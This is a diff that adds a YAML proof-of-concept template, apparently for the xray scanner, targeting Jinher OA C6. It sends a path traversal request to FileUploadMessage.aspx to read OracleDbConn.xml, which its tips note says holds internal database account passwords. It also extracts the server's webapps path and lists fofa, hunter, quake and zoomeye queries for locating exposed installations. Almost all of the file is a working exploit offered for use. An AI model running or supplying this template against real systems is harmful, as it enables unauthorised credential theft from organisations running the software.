@@ -1,0 +1,40 @@
+detail:
+  author: 
+  links:
+    - x
+  vulnerability:
+    level: critical
+    fofa-query: app="Jinher-OA"
+    hunter-query: app.name="金和 OA"
+    quake-query: app:"金和OA"
+    zoomeye-query: app:"金和OA"
+    threatbook-query: 
+    cve: 
+    cnvd: 
+    tips: OracleDbConn.xml(内网 数据库账号密码)
+
+name: poc-yaml-jinhe-c6-FileUploadMessage.aspx-file-read
+transport: http
+set:
+    s1: randomInt(1000000000, 9000000000)
+    s2: randomLowercase(8)
+    reverse: newReverse()
+    reverseURL: reverse.url
+rules:
+  r0:
+    request:
+      method: GET
+      cache: true
+      path: /C6/JHSoft.WCF/FunctionNew/FileUploadMessage.aspx?filename=../../../C6/JhSoft.Web.Dossier.JG/JhSoft.Web.Dossier.JG/XMLFile/OracleDbConn.xml
+      follow_redirects: false
+      headers: 
+      body:    
+    expression: >-
+      response.status == 200 && response.body_string.contains("Db") && response.body_string.contains("xml version")
+
+    output:
+      search: |-
+        "(?P<path>.+)/webapps".bsubmatch(response.body)
+      path: search["path"]
+
+expression: r0() 
